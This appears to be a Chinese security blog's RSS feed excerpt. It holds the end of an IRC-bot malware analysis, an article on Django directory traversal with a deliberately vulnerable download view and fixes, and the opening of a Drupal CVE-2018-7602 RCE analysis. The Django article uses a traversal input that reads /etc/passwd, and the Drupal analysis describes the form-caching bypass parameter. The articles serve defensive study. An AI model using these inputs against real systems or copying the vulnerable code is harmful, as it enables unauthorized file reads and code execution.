&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528281340573.png&#34; alt=&#34;1528281340573&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;行为特征&#34;&gt;行为特征&lt;/h4&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528277061564.png&#34; alt=&#34;1528277061564&#34; /&gt;&lt;/p&gt;

&lt;p&gt;在bot启动的时候，不会以自身的进程启动，而是在&lt;code&gt;sshd&lt;/code&gt;，&lt;code&gt;apache&lt;/code&gt;等进程中随机fork一个启动，fork失败则退出脚本，这样子非常隐蔽地隐藏了自身进程，随后在加入IRC频道的过程中也会随机选择一个IRC版本号加入。&lt;/p&gt;

&lt;p&gt;在运行Perl IrcBot后，脚本选择以&lt;code&gt;/usr/sbin/cron&lt;/code&gt;的进程启动，而且可以明显看到CPU占用达到100%，脚本潜伏在正常进程中很难被发现。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528274476743.png&#34; alt=&#34;1528274476743&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;0x04-总结&#34;&gt;0x04 总结&lt;/h2&gt;

&lt;p&gt;这两款IRC bot在互联网上已经存在很久了，最近被广泛利用的Drupal RCE漏洞和Weblogic XMLDecoder反序列化漏洞使此类基于IRC协议的恶意脚本重新流行起来，根据在线文件分享平台&lt;a href=&#34;https://pastebin.com/search?q=ircbot&#34;&gt;pastebin&lt;/a&gt;查询相关脚本也不在少数，而且存在多种语言版本的IRC bot，黑客直接通过各种远程漏洞植入样本，接受C&amp;amp;C控制，具有很大的危害性。&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>Django框架防止目录穿越——从路由传参说起</title>
      <link>https://kylingit.com/blog/django%E6%A1%86%E6%9E%B6%E9%98%B2%E6%AD%A2%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E4%BB%8E%E8%B7%AF%E7%94%B1%E4%BC%A0%E5%8F%82%E8%AF%B4%E8%B5%B7/</link>
      <pubDate>Wed, 16 May 2018 10:59:02 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/django%E6%A1%86%E6%9E%B6%E9%98%B2%E6%AD%A2%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E4%BB%8E%E8%B7%AF%E7%94%B1%E4%BC%A0%E5%8F%82%E8%AF%B4%E8%B5%B7/</guid>
      <description>

&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;最近审计代码过程中出现了没有正确处理url形成目录穿越，导致可以读取或下载任意文件的案例，过程很简单，由此却引发了和小伙伴的讨论，对风险的控制需要依赖框架本身还是必须从根本上规避风险点。下面就通过目录遍历漏洞的案例分析一下django的路由传参方式，以及在日常开发中如何避免此类风险。&lt;/p&gt;

&lt;h3 id=&#34;0x01-示例代码&#34;&gt;0x01 示例代码&lt;/h3&gt;

&lt;p&gt;我们写一个简单的views，用来实现文件下载功能，代码如下&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import os

from django.http import HttpResponseNotFound, HttpResponse

# Create your views here.
def file_download(request, filename):
    path = &#39;/tmp/test/2&#39;
    full_path = os.path.join(path, filename)
    if not os.path.exists(full_path):
        return HttpResponseNotFound(&#39;&amp;lt;h1&amp;gt;file not found&amp;lt;/h1&amp;gt;&#39;)
    else:
        response = HttpResponse(read_file(full_path))
        response[&#39;Content-Type&#39;] = &#39;application/octet-stream&#39;
        response[&#39;Content-Length&#39;] = os.path.getsize(full_path)
        response[&#39;Content-Disposition&#39;] = &#39;attachment; filename=%s&#39; % filename
        response[&#39;Accept-Ranges&#39;] = &#39;bytes&#39;
        return response

def read_file(filename, bufsize=8192):
    try:
        with open(filename, &#39;rb&#39;) as f:
            while True:
                content = f.read(bufsize)
                if content:
                    yield content
                else:
                    break
    except Exception as e:
        print(e.message)
        print(&#39;read error&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;代码很简单，就不过多解释了，目的是提供&lt;code&gt;/tmp/test/2/&lt;/code&gt;目录下的文件下载。&lt;code&gt;read_file()&lt;/code&gt;使用了切片避免文件过大造成拒绝服务风险。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;/tmp/test/&lt;/code&gt;结构如下，内容分别为1,2&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;test
├── 1
│   └── 1.txt
└── 2
    └── 2.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;有经验的同学马上就能看出&lt;code&gt;file_download()&lt;/code&gt;对传入的文件名并没有任何限制，只是做了文件是否存在的判断，也就是说我们可以传入&lt;code&gt;/../1/1.txt&lt;/code&gt;的文件名，&lt;code&gt;full_path&lt;/code&gt;经过拼接就会成为&lt;code&gt;/tmp/test/2/../../1/1.txt&lt;/code&gt;，传入&lt;code&gt;read_file()&lt;/code&gt;就能够读取到1.txt&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/JUIFX&#34; alt=&#34;1.txt&#34; /&gt;
类似的，如果我们传入&lt;code&gt;../../../etc/passwd&lt;/code&gt;就能下载到敏感文件&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/h0bP3&#34; alt=&#34;passwd&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可是事实上每次都是如此吗？&lt;/p&gt;

&lt;p&gt;其实这跟我们如何处理传入的url有关，也就是Django对于url路由的处理。&lt;/p&gt;

&lt;h3 id=&#34;0x02-测试&#34;&gt;0x02 测试&lt;/h3&gt;

&lt;p&gt;在刚才的示例中，我们在&lt;code&gt;urls.py&lt;/code&gt;中是这样定义路由的&lt;/p&gt;

&lt;p&gt;&lt;code&gt;url(r&#39;^download/(.+)$&#39;, &amp;quot;mysite.views.file_download&amp;quot;),&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;相信这也是很多同学会采用的写法，匹配任意文件名使得可以下载&lt;code&gt;/tmp/test/2&lt;/code&gt;中的任意文件，认为在views里面限定了目录，只能读取到该文件夹下的内容，忽略了用户可以输入&lt;code&gt;../&lt;/code&gt;进行目录穿越，而在接收文件名的时候却没有对参数进行任何过滤，这样就会导致一个任意文件读取的漏洞。&lt;/p&gt;

&lt;p&gt;在django2.0中，url路由部分由&lt;code&gt;path&lt;/code&gt;代替&lt;code&gt;url&lt;/code&gt;，即原来的&lt;/p&gt;

&lt;p&gt;&lt;code&gt;url(r&#39;^articles/(?P&amp;lt;year&amp;gt;[0-9]{4})/$&#39;, views.year_archive),&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;新语法&lt;/p&gt;

&lt;p&gt;&lt;code&gt;path(&#39;articles/&amp;lt;int:year&amp;gt;/&#39;, views.year_archive),&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;新语法支持url参数的类型转化。这里的year_archive函数接收到的year参数作为参数，并且会自动转换year为整型而不是字符串。&lt;/p&gt;

&lt;p&gt;这里的int称为路径转换器，&lt;a href=&#34;https://docs.djangoproject.com/en/2.0/topics/http/urls/#path-converters&#34;&gt;Path converters&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;默认情况下，Django内置下面的路径转换器:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;str - &lt;strong&gt;Matches any non-empty string, excluding the path separator, &amp;lsquo;/&amp;rsquo;.&lt;/strong&gt; This is the &lt;strong&gt;default&lt;/strong&gt; if a converter isn’t included in the expression.&lt;/li&gt;
&lt;li&gt;int - Matches zero or any positive integer. Returns an int.&lt;/li&gt;
&lt;li&gt;slug - Matches any slug string consisting of ASCII letters or numbers, plus the hyphen and underscore characters. For example, building-your-1st-django-site.&lt;/li&gt;
&lt;li&gt;uuid - Matches a formatted UUID. To prevent multiple URLs from mapping to the same page, dashes must be included and letters must be lowercase. For example, 075194d3-6885-417e-a8a8-6c931e272f00. Returns a UUID instance.&lt;/li&gt;
&lt;li&gt;path - &lt;strong&gt;Matches any non-empty string, including the path separator, &amp;lsquo;/&amp;rsquo;.&lt;/strong&gt; This allows you to match against a complete URL path rather than just a segment of a URL path as with str.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我们重点关注一下&lt;code&gt;str&lt;/code&gt;和&lt;code&gt;path&lt;/code&gt;的区别，也就是&lt;/p&gt;

&lt;p&gt;&lt;code&gt;path(&#39;download/&amp;lt;str:filename&amp;gt;&#39;, views.file_download),&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;和&lt;/p&gt;

&lt;p&gt;&lt;code&gt;path(&#39;download/&amp;lt;path:filename&amp;gt;&#39;, views.file_download),&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;有什么不一样。&lt;/p&gt;

&lt;p&gt;根据&lt;a href=&#34;https://docs.djangoproject.com/en/2.0/topics/http/urls/#path-converters&#34;&gt;Django文档&lt;/a&gt;描述，str不匹配&lt;code&gt;/&lt;/code&gt;而path匹配&lt;code&gt;/&lt;/code&gt;，意味着当使用&lt;code&gt;&amp;lt;path:filename&amp;gt;&lt;/code&gt;的时候我们还是可以传进去&lt;code&gt;../&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;测试一下&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;使用&lt;code&gt;path(&#39;download/&amp;lt;path:filename&amp;gt;&#39;, views.file_download),&lt;/code&gt;的情况&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/KkoFJ&#34; alt=&#34;path&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;使用&lt;code&gt;path(&#39;download/&amp;lt;str:filename&amp;gt;&#39;, views.file_download),&lt;/code&gt;的情况&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://ob5vt1k7f.qnssl.com/EQBtS&#34; alt=&#34;str&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到当我们定义url的时候如果使用了&lt;code&gt;&amp;lt;path:filename&amp;gt;&lt;/code&gt;的形式，传入的包含&lt;code&gt;/&lt;/code&gt;的参数会被原样接收，当作完整参数交给路由部分处理，而定义为&lt;code&gt;&amp;lt;str:filename&amp;gt;&lt;/code&gt;(默认即为str)的时候，&lt;code&gt;/&lt;/code&gt;不被后端接收，这时候&lt;code&gt;xx.com/download/../1/1.txt&lt;/code&gt;这种路径下浏览器就根据url往上跳一级，也就是&lt;code&gt;xx.com/1/1.txt&lt;/code&gt;，django收到了的请求也是如此，于是django抛出一个找不到对应页面的异常&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://ob5vt1k7f.qnssl.com/bZQdj&#34; alt=&#34;404&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Django2.0的url虽然更改了写法，但依然向老版本兼容，兼容的办法就是用&lt;code&gt;re_path()&lt;/code&gt;方法代替&lt;code&gt;path()&lt;/code&gt;方法&lt;/p&gt;

&lt;p&gt;&lt;code&gt;re_path(&#39;download/(?P&amp;lt;filename&amp;gt;.+)&#39;, views.file_download),&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;这个匹配方式和1.8版本中&lt;code&gt;url(r&#39;^download/(.+)$&#39;, &amp;quot;mysite.views.file_download&amp;quot;),&lt;/code&gt;的意思是一样的，只是写法不同&lt;/p&gt;

&lt;p&gt;我们知道任何一种路由写法在经过django的urls模块相关方法处理之后都会转换为正则表达式进行匹配，之所以几种方式匹配结果不一样是因为处理完成后生成的正则不一样，把url路由转换为正则表达式的过程只会在django启动的时候编译一次，接收到的任何url形式都会根据生成的正则来路由到views定义的相关方法，urls模块就不用每次都去处理用户传递的url。&lt;/p&gt;

&lt;h3 id=&#34;0x03-断点分析&#34;&gt;0x03 断点分析&lt;/h3&gt;

&lt;p&gt;我们从代码层面来看一下这几者的区别&lt;/p&gt;

&lt;h5 id=&#34;1-re-path-download-p-filename-方式&#34;&gt;1.&lt;code&gt;re_path(&#39;download/(?P&amp;lt;filename&amp;gt;.+)&#39;&lt;/code&gt;方式&lt;/h5&gt;

&lt;p&gt;在&lt;code&gt;/Lib/site-packages/django/urls/conf.py&lt;/code&gt;中定义了相关方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/uPvF8&#34; alt=&#34;re_path()&#34; /&gt;
&lt;code&gt;partial()&lt;/code&gt;方法的作用就是把一个函数作为另一个函数的参数传入，这里就是把&lt;code&gt;RegexPattern()&lt;/code&gt;类作为参数传进&lt;code&gt;_path()&lt;/code&gt;方法，因为在下面第70行&lt;code&gt;RegexPattern()&lt;/code&gt;就作为处理&lt;code&gt;re_path()&lt;/code&gt;时的方法&lt;/p&gt;

&lt;p&gt;&lt;code&gt;pattern = Pattern(route, name=name, is_endpoint=True)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;跟入&lt;code&gt;RegexPattern()&lt;/code&gt;类 &lt;code&gt;/Lib/site-packages/django/urls/resolvers.py:136&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;构造方法之后regex就确定为我们定义的表达式，也就是&lt;code&gt;&#39;download/(?P&amp;lt;filename&amp;gt;.+)&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/4dWIr&#34; alt=&#34;regex&#34; /&gt;
这种情况下是可以匹配任何字符串的，起不到防护目录穿越的作用&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/cEbp5&#34; alt=&#34;regex&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;2-path-download-path-filename-方式&#34;&gt;2. &lt;code&gt;path(&#39;download/&amp;lt;path:filename&amp;gt;&#39;&lt;/code&gt;方式&lt;/h5&gt;

&lt;p&gt;同样的，第一步还是进入到&lt;code&gt;/Lib/site-packages/django/urls/conf.py&lt;/code&gt;，处理&lt;code&gt;path()&lt;/code&gt;相关的就交给&lt;code&gt;RoutePattern()&lt;/code&gt;类&lt;/p&gt;

&lt;p&gt;&lt;code&gt;path = partial(_path, Pattern=RoutePattern)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;跟入&lt;code&gt;RoutePattern()&lt;/code&gt;类  &lt;code&gt;/Lib/site-packages/django/urls/resolvers.py:234&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;初始化过程中进行了route转换成regex的操作&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def __init__(self, route, name=None, is_endpoint=False):
    self._route = route
    self._regex_dict = {}
    self._is_endpoint = is_endpoint
    self.name = name
    self.converters = _route_to_regex(str(route), is_endpoint)[1]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;跟入&lt;code&gt;_route_to_regex()&lt;/code&gt;方法，&lt;code&gt;/Lib/site-packages/django/urls/resolvers.py:194&lt;/code&gt;，看到该方法描述的功能就是将路径模式转换为正则表达式。&lt;/p&gt;

&lt;p&gt;首先对我们的&amp;rdquo;路由&amp;rdquo;通过&lt;code&gt;_PATH_PARAMETER_COMPONENT_RE()&lt;/code&gt;方法使用正则进行分割，&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;_PATH_PARAMETER_COMPONENT_RE = re.compile(
    r&#39;&amp;lt;(?:(?P&amp;lt;converter&amp;gt;[^&amp;gt;:]+):)?(?P&amp;lt;parameter&amp;gt;\w+)&amp;gt;&#39;
)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;取出&lt;code&gt;converter&lt;/code&gt;部分，也就是我们指定的&lt;code&gt;path&lt;/code&gt;，然后判断如果&lt;code&gt;converter&lt;/code&gt;为空的话就赋值为&amp;rsquo;str&amp;rsquo;，这也就是为什么我们不指定路径转换器时默认是str的原因。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/2Yr3G&#34; alt=&#34;converter&#34; /&gt;
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/rMvhH&#34; alt=&#34;path&#34; /&gt;&lt;/p&gt;

&lt;p&gt;接下来对转换器部分的操作&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;try:
    converter = get_converter(raw_converter)
except KeyError as e:
    raise ImproperlyConfigured(
        &amp;quot;URL route &#39;%s&#39; uses invalid converter %s.&amp;quot; % (original_route, e)
    )
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;跟入&lt;code&gt;get_converter()&lt;/code&gt;方法，&lt;code&gt;/Lib/site-packages/django/urls/converters.py:69&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;最后调用的是&lt;code&gt;get_converters()&lt;/code&gt;，看到该方法里面定义了一些默认属性，这些属性的值在这个文件上方定义，
这里我们看到定义了文档中提到的5种路径转换器&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;DEFAULT_CONVERTERS = {
    &#39;int&#39;: IntConverter(),
    &#39;path&#39;: PathConverter(),
    &#39;slug&#39;: SlugConverter(),
    &#39;str&#39;: StringConverter(),
    &#39;uuid&#39;: UUIDConverter(),
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;相对应的regex值也就在这里被定义&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/cft5C&#34; alt=&#34;default_regex&#34; /&gt;
于是在&lt;code&gt;decorating_function()&lt;/code&gt;通过&lt;code&gt;cache_get()&lt;/code&gt;方法取到了这些转换器对应的表达式，最后进行了拼接&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/vUIRy&#34; alt=&#34;Untitled Image&#34; /&gt;&lt;/p&gt;

&lt;p&gt;通过&lt;code&gt;parts.append&lt;/code&gt;拼接
&lt;code&gt;parts.append(&#39;(?P&amp;lt;&#39; + parameter + &#39;&amp;gt;&#39; + converter.regex + &#39;)&#39;)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;此时的&amp;rsquo;parameter&amp;rsquo;值即为&amp;rsquo;filename&amp;rsquo;，regex值为converter对象的属性，也就是&lt;code&gt;&#39;.+&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/I6I4E&#34; alt=&#34;regex&#34; /&gt;&lt;/p&gt;

&lt;p&gt;最后拼接成的正则表达式为&lt;code&gt;&#39;^download\\/(?P&amp;lt;filename&amp;gt;.+)$&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;与我们使用&lt;code&gt;re_path()&lt;/code&gt;时的表达式是一样的，所以也能匹配到&lt;code&gt;../&lt;/code&gt;之类的字符串，依旧起不到防止目录穿越的作用&lt;/p&gt;

&lt;h5 id=&#34;3-path-download-str-filename-方式&#34;&gt;3. &lt;code&gt;path(&#39;download/&amp;lt;str:filename&amp;gt;&#39;&lt;/code&gt;方式&lt;/h5&gt;

&lt;p&gt;接下来看&lt;code&gt;path(&#39;download/&amp;lt;str:filename&amp;gt;&#39;&lt;/code&gt;方式，不指定converter时&lt;code&gt;path(&#39;download/&amp;lt;filename&amp;gt;&#39;&lt;/code&gt;默认的就是这种方式&lt;/p&gt;

&lt;p&gt;同样跟入到&lt;code&gt;RoutePattern()&lt;/code&gt;类  &lt;code&gt;/Lib/site-packages/django/urls/resolvers.py:234&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;流程跟上面指定&lt;code&gt;path&lt;/code&gt;的方式一样，&lt;code&gt;converter&lt;/code&gt;为空时设置为&amp;rsquo;str&amp;rsquo;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/LKW7J&#34; alt=&#34;str&#34; /&gt;&lt;/p&gt;

&lt;p&gt;此时对应的regex值为&lt;code&gt;&#39;[^/]+&#39;&lt;/code&gt;，也就是不匹配&lt;code&gt;&#39;/&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://ob5vt1k7f.qnssl.com/iVQBV&#34; alt=&#34;cache&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://ob5vt1k7f.qnssl.com/prryr&#34; alt=&#34;converter&#34; /&gt;
最终拼接成的正则为&lt;code&gt;&#39;^download\\/(?P&amp;lt;filename&amp;gt;[^/]+)$&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;这种情况下由于不匹配&lt;code&gt;/&lt;/code&gt;我们就无法传入&lt;code&gt;../&lt;/code&gt;之类的字符串，也就不能穿越目录&lt;/p&gt;

&lt;h4 id=&#34;流程图&#34;&gt;流程图&lt;/h4&gt;

&lt;p&gt;画了一张简单的流程图方便理解上述三种情况&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/t5Tay&#34; alt=&#34;process&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;0x04-如何避免-正确的代码&#34;&gt;0x04 如何避免&amp;amp;正确的代码&lt;/h3&gt;

&lt;p&gt;把django处理url的各种情况理清了之后可能有同学会问，是不是以后都用&lt;code&gt;path(&#39;download/&amp;lt;str:filename&amp;gt;&#39;&lt;/code&gt;的方式就能避免目录穿越呢？实际上是不建议这样的，我们不能把风险点由存在缺陷的代码处转移到依赖框架上面，主要原因有二&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;我们无法确保每次写url传递规则的时候不出错，特别是项目庞大之后为了兼顾功能而忽略一些安全隐患点；&lt;/li&gt;
&lt;li&gt;存在缺陷的代码不能就这样放着，因为无法保证在别处不会调用这块代码，必须把风险点从根本上消除。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;回到代码脆弱性本身，如何从根源处消除目录遍历漏洞呢？
一个想法是限定basedir，并递归过滤任何&lt;code&gt;../&lt;/code&gt;之类的字符串，当然也要考虑经过url encode之后的路径，另一个简单的方法是使用&lt;code&gt;os.path.basename()&lt;/code&gt;方法，这个方法会忽略前面的路径只取到文件名，可以杜绝此类漏洞。&lt;/p&gt;

&lt;h3 id=&#34;0x05-总结&#34;&gt;0x05 总结&lt;/h3&gt;

&lt;p&gt;本文从目录遍历漏洞入手，分析了django框架处理url传递的逻辑，以及如何正确控制风险点避免出现问题代码，遵循的原则就是不要相信用户的输入，严格控制每一个参数。&lt;/p&gt;

&lt;p&gt;感谢阅读，有任何不足之处欢迎指正。&lt;/p&gt;

&lt;p&gt;参考:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.djangoproject.com/en/2.0/topics/http/urls/&#34;&gt;https://docs.djangoproject.com/en/2.0/topics/http/urls/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.lijiejie.com/python-django-directory-traversal/&#34;&gt;http://www.lijiejie.com/python-django-directory-traversal/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/arbitrary-files-read-via-static-requests.html&#34;&gt;https://www.leavesongs.com/PENETRATION/arbitrary-files-read-via-static-requests.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>CVE-2018-7602 Drupal 内核远程代码执行漏洞分析</title>
      <link>https://kylingit.com/blog/cve-2018-7602-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
      <pubDate>Thu, 26 Apr 2018 17:21:11 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/cve-2018-7602-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;h4 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h4&gt;

&lt;p&gt;4月25日，Drupal官方发布通告，Drupal Core 存在一个远程代码执行漏洞，影响 7.x 和 8.x 版本。据分析，这个漏洞是&lt;code&gt;CVE-2018-7600&lt;/code&gt;的绕过利用，两个漏洞原理是一样的，通告还称，已经发现了这个漏洞和&lt;code&gt;CVE-2018-7600&lt;/code&gt;的在野利用，详情请看 &lt;a href=&#34;https://www.drupal.org/sa-core-2018-004&#34;&gt;https://www.drupal.org/sa-core-2018-004&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h4&gt;

&lt;p&gt;Drupal 6.x，7.x，8.x&lt;/p&gt;

&lt;p&gt;修复版本
Drupal 7.59，Drupal 8.4.8，Drupal 8.5.3&lt;/p&gt;

&lt;h4 id=&#34;0x03-环境搭建&#34;&gt;0x03 环境搭建&lt;/h4&gt;

&lt;p&gt;历史版本
&lt;a href=&#34;https://www.drupal.org/project/drupal/releases&#34;&gt;https://www.drupal.org/project/drupal/releases&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x04-漏洞分析&#34;&gt;0x04 漏洞分析&lt;/h4&gt;

&lt;p&gt;分析还是以7.57版本为例。跟7600漏洞的7.x版本很相似，只不过入口不一样，可以参考&lt;a href=&#34;http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/&#34;&gt;http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;上回漏洞的关键点是让系统缓存一个&lt;code&gt;form_build_id&lt;/code&gt;，这个form存着我们传入的恶意参数，第二个请求从中取出来然后执行。
这次的原理还是一样，触发漏洞还是需要发两个post包，一个存入&lt;code&gt;form_build_id&lt;/code&gt;一个取出后执行。&lt;/p&gt;

&lt;p&gt;这次的问题出在删除文章的时候，因此需要文章删除权限，我们先走一遍正常删除文章的逻辑&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/VGL3Y&#34; alt=&#34;delete&#34; /&gt;
请求中每个node即代表一篇文章。
可以看到是会重定向到文章页面的，根据上个漏洞的分析我们猜测，一定还是走到了&lt;code&gt;drupal_redirect_form()&lt;/code&gt;，我们已经知道如果走到&lt;code&gt;drupal_redirect_form()&lt;/code&gt;分支，是不会往数据库缓存&lt;code&gt;form_build_id&lt;/code&gt;的，我们的目的还是让程序不满足一定条件从而不进行表单提交后重定向，所以还是跟着&lt;code&gt;CVE-2018-7600&lt;/code&gt;的套路来走&lt;/p&gt;

&lt;p&gt;从代码层面看一下&lt;/p&gt;

&lt;p&gt;之前的流程还是一样，直接跳到&lt;code&gt;drupal_build_form()&lt;/code&gt;方法第386行&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;drupal_process_form($form_id, $form, $form_state);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;跟入&lt;code&gt;drupal_process_form()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/w0cQZ&#34; alt=&#34;drupal_process_form&#34; /&gt;
还是一样，&lt;code&gt;$form_state[&#39;submitted&#39;]&lt;/code&gt;被设置为true&lt;/p&gt;

&lt;p&gt;回到902行&lt;/p&gt;

&lt;p&gt;&lt;code&gt;if ($form_state[&#39;submitted&#39;] &amp;amp;&amp;amp; !form_get_errors() &amp;amp;&amp;amp; !$form_state[&#39;rebuild&#39;])&lt;/code&gt;
条件被满足，进入这个分支便会执行&lt;code&gt;drupal_redirect_form()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/aoYne&#34; alt=&#34;drupal_redirect_form&#34; /&gt;&lt;/p&gt;

&lt;p&gt;而在这一步之前需要经过的判断是&lt;code&gt;_form_element_triggered_scripted_submission()&lt;/code&gt;
所以回到一开始的问题，构造一个&lt;code&gt;_triggering_element_value&lt;/code&gt;使得键值对相等，从而不进行rebuild&lt;/p&gt;

&lt;p&gt;我们传入&lt;code&gt;_triggering_element_name=form_id&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/UBCWM&#34; alt=&#34;post&#34; /&gt;
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/Rbrm4&#34; alt=&#34;form_id&#34; /&gt;
可以看到条件被满足，&lt;code&gt;$form_state[&#39;submitted&#39;]&lt;/code&gt;没有被设置为true，还是保持默认值false&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/UYLtu&#34; alt=&#34;submitted&#34; /&gt;
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/o98bE&#34; alt=&#34;submitted&#34; /&gt;&lt;/p&gt;

&lt;p&gt;进入&lt;code&gt;drupal_rebuild_form()&lt;/code&gt;&lt;/p&gt;

